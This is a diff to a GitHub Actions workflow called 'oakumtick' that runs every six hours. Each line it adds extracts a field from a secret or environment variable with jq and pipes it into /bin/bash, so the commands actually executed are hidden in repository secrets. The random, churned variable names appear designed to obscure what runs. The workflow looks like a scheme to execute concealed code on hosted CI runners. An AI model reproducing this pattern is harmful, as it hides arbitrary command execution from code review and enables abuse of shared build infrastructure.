@@ -1,11 +1,9 @@
 name: oakumtick
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
-
-jobs:  # 32733
+    - cron: '38 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,18 +11,26 @@ jobs:  # 32733
       - uses: actions/checkout@v4
       - name: oakumtick
         env:
-          nsw778: ${{ secrets.nsw778 }}
+          wjto1: ${{ secrets.wjto1 }}
         run: |
-          echo $nsw778 | jq -r .h05436 | /bin/bash
-          echo $qpp57942 | jq -r .a55 | /bin/bash
-          echo $zz234 | jq -r .rlp5982 | /bin/bash
-          echo $intx170 | jq -r .yfh798 | /bin/bash
-          echo $erpg00939 | jq -r .ofsl01 | /bin/bash
-          echo $plmar65 | jq -r .z5 | /bin/bash
-          echo $uwd3 | jq -r .ihmh1 | /bin/bash
-          echo $jyugh346 | jq -r .uh64 | /bin/bash
-          echo $kipl83 | jq -r .ih7 | /bin/bash
-          echo $wbh64966 | jq -r .lypaq86688 | /bin/bash
-          echo $moyn922 | jq -r .z35946 | /bin/bash
-          echo $vfq08 | jq -r .hjkkx111 | /bin/bash
+          echo $wjto1 | jq -r .vk547 | /bin/bash
+          echo $nu39097 | jq -r .p80 | /bin/bash
+          echo $dvpwo74398 | jq -r .i79 | /bin/bash
+          echo $uzuze302 | jq -r .fqeve05 | /bin/bash
+          echo $z5 | jq -r .jebu65210 | /bin/bash
+          echo $bigfy7565 | jq -r .trffp781 | /bin/bash
+          echo $flqyx8146 | jq -r .p9481 | /bin/bash
+          echo $z627 | jq -r .olmvo23438 | /bin/bash
+          echo $slqls4 | jq -r .ueuni4 | /bin/bash
+          echo $bbxh6047 | jq -r .iwrar69 | /bin/bash
+          echo $yqhhq343 | jq -r .k1456 | /bin/bash
+          echo $ge7 | jq -r .anzn0 | /bin/bash
+          echo $eqku05 | jq -r .jytxb15931 | /bin/bash
+          echo $dwwv1 | jq -r .qayj859 | /bin/bash
+          echo $tp7055 | jq -r .svvnr966 | /bin/bash
+          echo $dv11035 | jq -r .pg713 | /bin/bash
+          echo $nkiln85 | jq -r .atbt114 | /bin/bash
+          echo $ul1 | jq -r .cvssz9 | /bin/bash
+          echo $scac72 | jq -r .k0624 | /bin/bash
+          echo $q68 | jq -r .rv6 | /bin/bash
 
